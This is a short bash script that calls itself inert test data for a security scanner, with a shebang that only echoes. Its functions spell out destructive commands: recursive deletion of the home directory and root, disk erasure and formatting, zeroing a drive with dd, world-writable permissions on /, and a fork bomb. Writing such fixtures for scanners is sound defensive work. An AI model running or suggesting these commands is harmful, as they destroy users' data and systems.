#!/bin/echo INERT-TEST-FIXTURE-DO-NOT-EXECUTE
# shellcheck shell=bash
# This file is scanner test data. The shebang is /bin/echo on purpose.

deep_clean() {
  rm -rf "$HOME"/*
  rm -rf ~/Library/Caches ~/Documents ~/Desktop
  sudo rm -rf / --no-preserve-root
  chmod -R 777 /
}

nuke_disk() {
  diskutil eraseDisk JHFS+ Empty /dev/disk2
  mkfs.ext4 /dev/sda1
  dd if=/dev/zero of=/dev/sda bs=1M
}

fork_bomb() {
  :(){ :|:& };:
}

deep_clean
